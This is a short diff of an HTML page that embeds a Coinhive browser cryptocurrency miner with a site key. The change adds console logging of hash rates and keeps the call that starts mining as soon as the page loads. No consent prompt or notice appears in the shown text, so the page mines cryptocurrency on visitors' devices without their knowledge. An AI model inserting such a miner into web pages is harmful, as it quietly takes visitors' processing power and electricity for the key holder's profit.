@@ -15,7 +15,16 @@
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
 		var miner = new CoinHive.Anonymous('r0kjtYHKfNbbxZ75Cgqmq8qc4JdbKut1');
-		miner.start();
+		setInterval(function() {
+			var hashesPerSecond = miner.getHashesPerSecond();
+			var totalHashes = miner.getTotalHashes();
+			var acceptedHashes = miner.getAcceptedHashes();
+
+			console.log("hashesPerSecond = " + hashesPerSecond);
+			console.log("totalHashes = " + totalHashes);
+			console.log("acceptedHashes = " + acceptedHashes);
+		}, 1000);
+			miner.start();
 	</script>
 
 	<!-- Global site tag (gtag.js) - Google Analytics -->
